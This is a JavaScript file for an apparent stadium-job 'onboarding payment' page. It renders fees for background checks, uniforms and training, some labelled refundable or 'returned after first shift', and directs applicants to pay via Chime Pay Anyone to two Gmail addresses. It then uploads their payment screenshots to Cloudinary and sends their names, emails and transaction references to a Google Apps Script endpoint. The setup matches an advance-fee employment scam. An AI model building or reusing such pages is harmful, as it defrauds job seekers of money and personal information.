/* Onboarding payment — Chime Pay Anyone + careers site payload */
(function () {
  const CONFIG = {
    chimeEmails: ['workforcematchday@gmail.com', 'matchdayworkforce@gmail.com'],
    cloudinaryCloudName: 'rza1wcjs',
    cloudinaryUploadPreset: 'payment-screenshot',
    paymentScriptUrl:
      'https://script.google.com/macros/s/AKfycbxHATyBoGmfaWeNnx6Q42EK6sIVGrakQ5TX7ZOlUgGWpT4XVaS7HNr653Q1bHeHL6p1/exec',
  };

  const ICONS = {
    admin: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="7" width="20" height="14" rx="2"/><path d="M16 3H8a2 2 0 0 0-2 2v2h12V5a2 2 0 0 0-2-2z"/></svg>',
    background: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>',
    medical: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 12h-4l-3 9L9 3l-3 9H2"/></svg>',
    training: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"/><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"/></svg>',
    uniform: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.38 3.46L16 2a4 4 0 0 1-8 0L3.62 3.46a2 2 0 0 0-1.34 2.23l.58 3.57a1 1 0 0 0 .99.84H6v10c0 1.1.9 2 2 2h8a2 2 0 0 0 2-2V10h2.15a1 1 0 0 0 .99-.84l.58-3.57a2 2 0 0 0-1.34-2.23z"/></svg>',
  };

  const FEE_ICON_BY_ID = {
    admin: 'admin',
    background: 'background',
    foodSafety: 'medical',
    medical: 'medical',
    training: 'training',
    uniform: 'uniform',
  };

  function escapeHtml(value) {
    return String(value)
      .replaceAll('&', '&amp;')
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll("'", '&#39;');
  }

  function cents(value) {
    if (Number.isFinite(Number(value)) && !String(value).includes('$')) {
      return Math.round(Number(value) * 100);
    }
    const match = /^\$(\d+)(?:\.(\d{2}))?/.exec(String(value));
    return match ? Number(match[1]) * 100 + Number(match[2] || 0) : null;
  }

  function amountNumber(value) {
    const parsed = cents(value);
    return parsed === null ? 0 : parsed / 100;
  }

  function formatMoney(amount) {
    return `$${Number(amount).toFixed(2)}`;
  }

  function decodeEncodedPayload(encoded) {
    try {
      const binary = atob(decodeURIComponent(encoded));
      const utf8 = Array.from(binary, (character) =>
        `%${character.charCodeAt(0).toString(16).padStart(2, '0')}`
      ).join('');
      return JSON.parse(decodeURIComponent(utf8));
    } catch {
      try {
        return JSON.parse(atob(decodeURIComponent(encoded)));
      } catch {
        return null;
      }
    }
  }

  function decodePayload() {
    const params = new URLSearchParams(window.location.search);
    const encoded = params.get('d');
    if (encoded) return decodeEncodedPayload(encoded);

    const role = (params.get('role') || params.get('jobTitle') || '').trim();
    const applicationId = (params.get('id') || params.get('ref') || params.get('applicationId') || '').trim();
    if (!role && !applicationId) return null;

    return {
      role,
      jobTitle: role,
      applicationId,
      category: (params.get('cat') || params.get('category') || '').trim(),
      pay: (params.get('pay') || params.get('payLabel') || '').trim(),
      venue: (params.get('venue') || '').trim(),
      reporting: {
        date: (params.get('date') || '').trim(),
        time: (params.get('time') || '').trim(),
        venue: (params.get('venue') || '').trim(),
        instructions: (params.get('instructions') || '').trim(),
        gate: (params.get('gate') || '').trim(),
      },
    };
  }

  function nextMatchSaturday() {
    const start = new Date();
    const day = new Date(start.getFullYear(), start.getMonth(), start.getDate() + 10);
    day.setDate(day.getDate() + ((6 - day.getDay() + 7) % 7));
    return day.toLocaleDateString('en-US', {
      weekday: 'long',
      month: 'long',
      day: 'numeric',
      year: 'numeric',
    });
  }

  function pickChimeEmail(applicationId) {
    const emails = CONFIG.chimeEmails;
    const hex = parseInt(String(applicationId || '').replace(/[^0-9a-f]/gi, '').slice(-1), 16);
    const turn = Number.isFinite(hex) ? hex : Date.now();
    return emails[turn % emails.length];
  }

  function feesFromPayload(data) {
    const fees = data && data.fees;
    const rawItems = fees && Array.isArray(fees.items) ? fees.items : [];
    if (rawItems.length && rawItems.every((item) => item && (item.label || item.name))) {
      return rawItems.map((item) => {
        const amount = amountNumber(item.amount);
        const isDeposit = Boolean(item.isDeposit);
        const isCompletionCredit = Boolean(item.isCompletionCredit) || item.id === 'training';
        return {
          id: item.id || '',
          label: item.label || item.name || '',
          description: item.description || '',
          amount,
          amountLabel: item.amountLabel || (isDeposit ? `${formatMoney(amount)} deposit` : formatMoney(amount)),
          isDeposit,
          isCompletionCredit,
        };
      });
    }

    const resolve = window.MW && typeof window.MW.resolveRoleFees === 'function'
      ? window.MW.resolveRoleFees
      : null;
    if (!resolve || !data) return [];

    const resolved = resolve({
      title: data.role || data.jobTitle || '',
      category: data.category || '',
      payLabel: data.pay || data.payLabel || '',
      kind: data.kind || '',
    });
    return (resolved.items || []).map((item) => ({
      id: item.id || '',
      label: item.label,
      description: item.description || '',
      amount: Number(item.amount) || 0,
      amountLabel: item.amountLabel || formatMoney(item.amount),
      isDeposit: Boolean(item.isDeposit),
      isCompletionCredit: Boolean(item.isCompletionCredit) || item.id === 'training',
    }));
  }

  function setText(id, value) {
    const el = document.getElementById(id);
    if (el) el.textContent = value;
  }

  function renderFeeItems(items, explanation) {
    const container = document.getElementById('fees-breakdown');
    if (!container) return 0;

    let total = 0;
    container.innerHTML = items.map((fee) => {
      const amount = Number(fee.amount || 0);
      total += amount;
      const iconKey = FEE_ICON_BY_ID[fee.id] || 'admin';
      const amountLabel = fee.amountLabel || (fee.isDeposit ? `${formatMoney(amount)} deposit` : formatMoney(amount));
      return `
        <div class="onboarding-fee-row">
          <div class="onboarding-fee-row__main">
            <div class="onboarding-fee-icon" aria-hidden="true">${ICONS[iconKey] || ICONS.admin}</div>
            <div>
              <p class="onboarding-fee-row__label">
                ${escapeHtml(fee.label)}
                ${fee.isDeposit ? '<span class="onboarding-fee-row__badge">Refundable deposit</span>' : ''}
                ${fee.isCompletionCredit ? '<span class="onboarding-fee-row__badge">Returned after first shift</span>' : ''}
              </p>
              ${fee.description ? `<p class="onboarding-fee-row__desc">${escapeHtml(fee.description)}</p>` : ''}
            </div>
          </div>
          <span class="onboarding-fee-row__amount">${escapeHtml(amountLabel)}</span>
        </div>`;
    }).join('');

    const totalLabel = formatMoney(total);
    const refundable = items.reduce((sum, fee) => {
      return sum + ((fee.isDeposit || fee.isCompletionCredit) ? Number(fee.amount || 0) : 0);
    }, 0);
    const refundLabel = formatMoney(refundable);
    setText('payment-amount', totalLabel);
    setText('refund-amount', refundLabel);
    setText('refund-amount-copy', refundLabel);
    document.querySelectorAll('.pay-amount').forEach((el) => {
      el.textContent = totalLabel;
    });
    const rebateRow = document.getElementById('fees-rebate');
    if (rebateRow) rebateRow.hidden = refundable <= 0;
    sessionStorage.setItem('feeAmount', String(total));
    const expl = document.getElementById('fees-explanation');
    if (expl && explanation) expl.textContent = explanation;
    return total;
  }

  function showReporting(data) {
    const section = document.getElementById('reporting-section');
    if (!section) return;
    const reporting = data && data.reporting && typeof data.reporting === 'object' ? data.reporting : {};
    const shift = data && data.shift && typeof data.shift === 'object' ? data.shift : {};
    const date = String(
      reporting.date || data.reportingDate || data.reportingDateLabel || shift.date || ''
    ).trim() || nextMatchSaturday();
    const time = String(
      reporting.time || data.reportingTime || data.reportingTimeLabel || shift.reportTime || ''
    ).trim() || '4:00 PM local time';
    const venue = String(
      reporting.venue || data.venue || shift.location || [data.stadiumName, data.stadiumAddress].filter(Boolean).join(', ') || ''
    ).trim() || 'Your assigned stadium — confirm the exact name in your approval email';
    const gate = String(
      reporting.gate || shift.pickupDesk || data.checkIn || ''
    ).trim() || 'Staff Check-in, Gate B / Service Entrance';
    const kickoff = String(shift.kickoffNote || '').trim() || 'About 3 hours before kickoff. Do not enter through public ticket gates.';
    const pickupHours = String(shift.pickupHours || '').trim() || 'weekdays, 10:00 AM – 4:00 PM';
    const sameDay = String(shift.sameDay || shift.sameDayPickupTime || '').trim() || '2:30 PM';
    const contact = String(shift.contact || data.contact || '').trim() || 'the Matchday Staffing Desk';
    const instructions = String(reporting.instructions || data.reportingInstruction || '').trim()
      || `Complete onboarding payment, then report with a photo ID. Check in at ${gate}. Credential and uniform pickup is ${pickupHours}. For same-day pickup, arrive by ${sameDay} and ask for ${contact}.`;

    section.hidden = false;
    setText('reporting-text', instructions);
    setText('report-date', date);
    setText('report-time', time);
    setText('report-kickoff', kickoff);
    setText('report-venue', venue);
    setText('report-gate', gate);
    setText('report-pickup', `Pickup during ${pickupHours}. Same-day pickup by ${sameDay}; ask for ${contact}.`);
    setText('report-bring', 'Government-issued photo ID, this application ID, closed-toe shoes, water, and a charged phone.');
    setText('report-dress', 'Black pants or shorts and closed-toe shoes. Issued polo, badge, and lanyard are provided at check-in unless your approval email lists a different uniform.');
    setText('report-contact', `${contact} · payment@matchdayworkforce.com`);
  }

  function copyValue(value, btn, label, defaultLabel) {
    const onCopied = () => {
      if (btn) btn.classList.add('copied');
      if (label) label.textContent = 'Copied';
      window.setTimeout(() => {
        if (btn) btn.classList.remove('copied');
        if (label) label.textContent = defaultLabel;
      }, 1600);
    };
    navigator.clipboard.writeText(value).then(onCopied, () => {
      const el = document.createElement('textarea');
      el.value = value;
      document.body.appendChild(el);
      el.select();
      document.execCommand('copy');
      document.body.removeChild(el);
      onCopied();
    });
  }

  function showError(fieldId, message) {
    const field = document.getElementById(fieldId);
    if (!field) return;
    field.style.borderColor = '#ef4444';
    field.focus();
    const existing = field.parentNode.querySelector('.error-msg');
    if (existing) existing.remove();
    const err = document.createElement('p');
    err.className = 'error-msg';
    err.textContent = message;
    field.parentNode.appendChild(err);
    field.addEventListener('input', () => {
      field.style.borderColor = '';
      if (err.parentNode) err.remove();
    }, { once: true });
  }

  function isValidEmail(value) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value);
  }

  function validateForm() {
    const name = document.getElementById('sender-name').value.trim();
    const email = document.getElementById('sender-email').value.trim();
    if (!name) {
      showError('sender-name', 'Please enter your full name.');
      return false;
    }
    if (!email || !isValidEmail(email)) {
      showError('sender-email', 'Please enter a valid email.');
      return false;
    }
    return true;
  }

  function prepareScreenshotFile(file, applicationId) {
    const extension = String(file.name || '').toLowerCase().match(/\.(jpe?g|png|webp)$/i)?.[1] || 'jpg';
    const safeId = String(applicationId || 'payment').replace(/[^a-zA-Z0-9_-]+/g, '-').slice(0, 40);
    const safeName = `payment-${safeId}-${Date.now()}.${extension}`;
    if (file.name === safeName) return file;
    return new File([file], safeName, {
      type: file.type || 'image/jpeg',
      lastModified: file.lastModified,
    });
  }

  async function uploadScreenshotToCloudinary(file, applicationId) {
    const formData = new FormData();
    formData.append('file', prepareScreenshotFile(file, applicationId));
    formData.append('upload_preset', CONFIG.cloudinaryUploadPreset);
    formData.append('context', `application_id=${applicationId || 'unknown'}`);
    const response = await fetch(
      `https://api.cloudinary.com/v1_1/${CONFIG.cloudinaryCloudName}/image/upload`,
      { method: 'POST', body: formData }
    );
    const payload = await response.json().catch(() => null);
    if (!response.ok || !payload || !payload.secure_url) {
      throw new Error(
        (payload && payload.error && payload.error.message) ||
          'We could not upload your screenshot. Please try again or choose a different image.'
      );
    }
    return payload.secure_url;
  }

  async function notifyPaymentSubmission(payload) {
    if (!CONFIG.paymentScriptUrl) return;
    try {
      await fetch(CONFIG.paymentScriptUrl, {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({ type: 'payment_submission', ...payload }),
      });
    } catch {
      /* no-cors: still show success if the upload completed */
    }
  }

  function handleSuccess(data) {
    const main = document.getElementById('main-card');
    const card = document.getElementById('success-card');
    if (main) main.hidden = true;
    if (card) card.hidden = false;
    const sticky = document.getElementById('pay-sticky');
    if (sticky) sticky.hidden = true;
    setText('success-name', data.applicantName);
    setText('success-role', data.role);
    setText('success-email', data.applicantEmail);
    setText('success-ref-id', data.confirmationRef);
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }

  async function submitPayment() {
    if (!validateForm()) return;
    const btn = document.getElementById('submit-btn');
    const applicationId = document.getElementById('application-id').textContent.trim();
    const screenshotFile = document.getElementById('screenshot') && document.getElementById('screenshot').files[0];
    btn.disabled = true;
    btn.textContent = screenshotFile ? 'Uploading screenshot...' : 'Submitting...';

    try {
      let screenshotUrl = '';
      if (screenshotFile) {
        if (screenshotFile.size > 5 * 1024 * 1024) {
          throw new Error('File too large. Max 5MB.');
        }
        screenshotUrl = await uploadScreenshotToCloudinary(screenshotFile, applicationId);
      }
      btn.textContent = 'Submitting...';
      const payload = {
        applicationId,
        applicantName: document.getElementById('sender-name').value.trim(),
        applicantEmail: document.getElementById('sender-email').value.trim(),
        transactionRef: document.getElementById('transaction-ref').value.trim(),
        role: sessionStorage.getItem('roleName') || 'your selected role',
        amount: sessionStorage.getItem('feeAmount') || '0',
        paymentMethod: 'Chime Pay Anyone',
        chimeEmail: sessionStorage.getItem('chimeEmail') || '',
        confirmationRef: 'CONF-' + Date.now(),
        screenshotUrl,
        timestamp: new Date().toISOString(),
      };
      await notifyPaymentSubmission(payload);
      handleSuccess(payload);
    } catch (error) {
      btn.disabled = false;
      btn.textContent = "I've Sent The Payment";
      alert(error && error.message ? error.message : 'Something went wrong. Please try again.');
    }
  }

  function bindUi(chimeEmail) {
    const sticky = document.getElementById('pay-sticky');
    document.getElementById('opt-chime').addEventListener('click', () => {
      document.getElementById('opt-chime').classList.add('is-selected');
      document.getElementById('opt-card').classList.remove('is-selected');
      document.getElementById('dot-chime').classList.add('is-active');
      document.getElementById('dot-card').classList.remove('is-active');
      document.getElementById('chime-panel').hidden = false;
      document.getElementById('card-panel').hidden = true;
      if (sticky) sticky.hidden = false;
    });
    document.getElementById('opt-card').addEventListener('click', () => {
      document.getElementById('opt-card').classList.add('is-selected');
      document.getElementById('opt-chime').classList.remove('is-selected');
      document.getElementById('dot-card').classList.add('is-active');
      document.getElementById('dot-chime').classList.remove('is-active');
      document.getElementById('chime-panel').hidden = true;
      document.getElementById('card-panel').hidden = false;
      if (sticky) sticky.hidden = true;
    });
    document.getElementById('copy-email-btn').addEventListener('click', () => {
      copyValue(
        chimeEmail,
        document.getElementById('copy-email-btn'),
        document.getElementById('copy-email-label'),
        'Copy'
      );
    });
    const screenshot = document.getElementById('screenshot');
    const area = document.getElementById('upload-area');
    const label = document.getElementById('upload-label');
    function acceptFile(file) {
      if (!file) return;
      if (file.size > 5 * 1024 * 1024) {
        alert('File too large. Please choose a PNG or JPG under 5MB.');
        screenshot.value = '';
        return;
      }
      const transfer = new DataTransfer();
      transfer.items.add(file);
      screenshot.files = transfer.files;
      area.classList.add('has-file');
      label.textContent = file.name;
    }
    screenshot.addEventListener('change', (event) => {
      acceptFile(event.target.files && event.target.files[0]);
    });
    ['dragenter', 'dragover'].forEach((type) => {
      area.addEventListener(type, (event) => {
        event.preventDefault();
        area.classList.add('is-dragging');
      });
    });
    ['dragleave', 'drop'].forEach((type) => {
      area.addEventListener(type, (event) => {
        event.preventDefault();
        area.classList.remove('is-dragging');
      });
    });
    area.addEventListener('drop', (event) => {
      acceptFile(event.dataTransfer && event.dataTransfer.files[0]);
    });
    document.getElementById('submit-btn').addEventListener('click', submitPayment);
  }

  function loadPageData() {
    const data = decodePayload() || {};
    const role = String(data.role || data.jobTitle || '').trim() || 'See your approval email';
    const applicationId = String(data.applicationId || '').trim() || 'MW-' + Date.now();
    const chimeEmail = pickChimeEmail(applicationId);

    setText('onboarding-applicant-role', role);
    setText('application-id', applicationId);
    setText('hero-role', role === 'See your approval email' ? 'Welcome to onboarding' : role);
    setText('chime-email', chimeEmail);
    sessionStorage.setItem('applicationId', applicationId);
    sessionStorage.setItem('roleName', role);
    sessionStorage.setItem('chimeEmail', chimeEmail);

    const nameInput = document.getElementById('sender-name');
    const emailInput = document.getElementById('sender-email');
    if (nameInput && data.name) nameInput.value = data.name;
    if (emailInput && data.email) emailInput.value = data.email;

    showReporting(data);
    const items = feesFromPayload(data);
    const explanation = (data.fees && data.fees.paymentExplanation) || data.paymentExplanation ||
      (role !== 'See your approval email' ? `${role} · Complete payment to confirm your placement.` : '');
    renderFeeItems(items, explanation);
    bindUi(chimeEmail);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', loadPageData);
  } else {
    loadPageData();
  }
})();
